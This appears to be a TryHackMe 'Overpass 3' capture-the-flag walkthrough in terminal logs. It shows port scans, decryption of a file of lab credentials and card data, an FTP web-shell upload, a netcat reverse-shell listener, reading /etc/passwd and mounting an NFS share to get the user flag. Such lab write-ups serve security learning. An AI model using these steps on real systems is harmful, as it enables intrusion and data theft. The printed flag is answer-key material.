
`rustscan`

```sh
┌──(bopbap㉿ssa)-[~/Workspace/tryhackme/Overpass_3]
└─$ rustscan -a $IP --ulimit 5000 --range 1-65000 -t 2000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/bopbap/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.152.228:21
Open 10.10.152.228:22
Open 10.10.152.228:80
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 11:56 EDT
Initiating Ping Scan at 11:56
Scanning 10.10.152.228 [2 ports]
Completed Ping Scan at 11:56, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:56
Completed Parallel DNS resolution of 1 host. at 11:56, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:56
Scanning 10.10.152.228 [3 ports]
Discovered open port 80/tcp on 10.10.152.228
Discovered open port 21/tcp on 10.10.152.228
Discovered open port 22/tcp on 10.10.152.228
Completed Connect Scan at 11:56, 0.23s elapsed (3 total ports)
Nmap scan report for 10.10.152.228
Host is up, received syn-ack (0.23s latency).
Scanned at 2023-07-27 11:56:32 EDT for 1s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds


┌──(bopbap㉿ssa)-[~/Workspace/tryhackme/Overpass_3]
└─$
```


`nmap`
```sh
┌──(bopbap㉿ssa)-[~/Workspace/tryhackme/Overpass_3]
└─$ nmap -sC -sV -p- $IP -T4 -o nmap_full.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 11:56 EDT
Nmap scan report for 10.10.152.228
Host is up (0.23s latency).
Not shown: 65311 filtered tcp ports (no-response), 221 filtered tcp ports (host-unreach)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 de5b0eb540aa434d2a83311420779ca1 (RSA)
|   256 f4b5a660f4d1bfe2852e2e7e5f4cce38 (ECDSA)
|_  256 29e66109ed8a882b5574f2b733aedfc8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Overpass Hosting
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 391.13 seconds
```

```

    Paradox - Our lead web designer, Paradox can help you create your dream website from the ground up
    Elf - Overpass' newest intern, Elf. Elf helps maintain the webservers day to day to keep your site running smoothly and quickly.
    MuirlandOracle - HTTPS and networking specialist. Muir's many years of experience and enthusiasm for networking keeps Overpass running, and your sites, online all of the time.
    
	- James started Overpass, and keeps the business side running. If you have pricing questions or want to discuss how Overpass can help your business, reach out to him!

```

```sh
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
┌──(bopbap㉿ssa)-[~/Workspace/tryhackme/Overpass_3]
└─$ faketime  '2021-12-24 08:15:42' gpg  --output ./decrypted_msg.txt --decrypt ./CustomerDetails.xlsx.gpg
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
```


```sh

|Customer Name|Username|Password|Credit card number|CVC|
|Par. A. Doxx|paradox|ShibesAreGreat123|4111 1111 4555 1142|432|
|0day Montgomery|0day|OllieIsTheBestDog|5555 3412 4444 1115|642|
|Muir Land|muirlandoracle|v|5103 2219 1119 9245|737|
```

We have ftp user `paradox:ShibesAreGreat123`

We can upload file to web directory. Upload a shell and get a reverse shell.

```sh
┌──(bopbap㉿ssa)-[~/Workspace/tryhackme/Overpass_3]
└─$ rlwrap -cAr nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.11.29.109] from (UNKNOWN) [10.10.152.228] 60406
SOCKET: Shell has connected!
id
uid=48(apache) gid=48(apache) groups=48(apache)

```

`/etc/passwd`

```sh
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd:x:998:996:User for polkitd:/:/sbin/nologin
sssd:x:997:994:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:996:993::/var/lib/chrony:/sbin/nologin
rngd:x:995:992:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
james:x:1000:1000:James:/home/james:/bin/bash
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
nginx:x:994:991:Nginx web server:/var/lib/nginx:/sbin/nologin
paradox:x:1001:1001::/home/paradox:/bin/bash
```

`Magic data for mod_mime_magic`

```sh
find / -type f -name "*flag*" -exec ls -l {} + 2>/dev/null
```

There are share file `nfs`
```sh
┌──(bopbap㉿ssa)-[~/Workspace/tryhackme/Overpass_3/files]
└─$ sudo mount -t nfs $IP:/home/james nfs
[sudo] password for bopbap:
ls
^C

┌──(bopbap㉿ssa)-[~/Workspace/tryhackme/Overpass_3/files]
└─$ sudo mount -t nfs localhost:/home/james nfs
Created symlink /run/systemd/system/remote-fs.target.wants/rpc-statd.service → /lib/systemd/system/rpc-statd.service.
mount.nfs: mounting localhost:/home/james failed, reason given by server: No such file or directory

┌──(bopbap㉿ssa)-[~/Workspace/tryhackme/Overpass_3/files]
└─$ sudo mount -t nfs localhost: nfs

┌──(bopbap㉿ssa)-[~/Workspace/tryhackme/Overpass_3/files]
└─$ ls
nfs

┌──(bopbap㉿ssa)-[~/Workspace/tryhackme/Overpass_3/files]
└─$ cd nfs

┌──(bopbap㉿ssa)-[~/…/tryhackme/Overpass_3/files/nfs]
└─$ ls
user.flag

┌──(bopbap㉿ssa)-[~/…/tryhackme/Overpass_3/files/nfs]
└─$ cat user.flag
thm{3693fc86661faa21f16ac9508a43e1ae}

┌──(bopbap㉿ssa)-[~/…/tryhackme/Overpass_3/files/nfs]
└─$
```